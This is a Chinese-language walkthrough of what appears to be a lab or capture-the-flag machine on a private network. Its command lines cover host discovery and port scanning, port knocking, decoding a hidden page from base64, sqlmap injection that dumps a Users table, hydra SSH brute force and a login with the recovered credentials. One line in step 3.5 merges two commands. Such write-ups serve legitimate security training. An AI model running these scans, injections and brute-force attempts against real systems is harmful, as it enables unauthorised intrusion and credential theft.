1、通过netdiscover检测主机IP地址

netdiscover -r 192.168.207.0/24

2、通过nmap进行端口扫描

nmap -A -sS -sV -v -p- 192.168.207.172

查看只开放22的SSH端口

3、渗透测试

3.1 通过访问ssh服务，提示需要进行敲门才能开放端口

ssh 192.168.207.172 22

3.2 首先扫描1,2,3端口

nmap -r -Pn –p 1,2,3 192.168.207.172

3.3 重新扫描端口后1337端口已经开放

nmap -A -sS -sV -v -p- 192.168.207.172

3.4 页面打开以后只有一个图片，访问robots.txt文件，查看网页源代码得到一串base64值

3.5 使用base64二次解码得到一个PHP页面

echo THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh | base64 -decho Lzk3ODM0NTIxMC9pbmRleC5waHA= | base64 -d

3.6 访问页面后有登录的页面，使用sqlmap基于表单进行测试，发现有SQL注入漏洞

sqlmap -u 'http://192.168.207.172:1337/978345210/index.php' --forms --dbs --risk=3 --level=5 --threads=4 --batch

3.7 获取数据库Webapp的表信息和

sqlmap -u 'http://192.168.207.172:1337/978345210/index.php' --forms -D Webapp --tables --risk=3 --level=5 --threads=4 --batch
获取表信息只有一个Users

sqlmap -u 'http://192.168.207.172:1337/978345210/index.php' --forms -D Webapp -T Users --columns --risk=3 --level=5 --threads=4 --batch

获取user表中的字段信息

sqlmap -u 'http://192.168.207.172:1337/978345210/index.php' --forms -D Webapp -T Users --dump --risk=3 --level=5 --threads=4 --batch


获取字段所有内容

3.8 保存用户名和密码使用hydra进行爆破，获取到用户名为：smeagol，密码为：MyPreciousR00t

hydra -L username.txt -P pass.txt ssh://192.168.207.172

ssh smeagol@192.168.207.172
